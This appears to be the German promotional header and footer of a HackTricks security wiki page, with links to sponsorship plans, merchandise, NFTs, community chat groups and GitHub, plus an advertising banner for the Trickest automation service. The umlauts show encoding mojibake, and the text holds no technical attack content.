* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
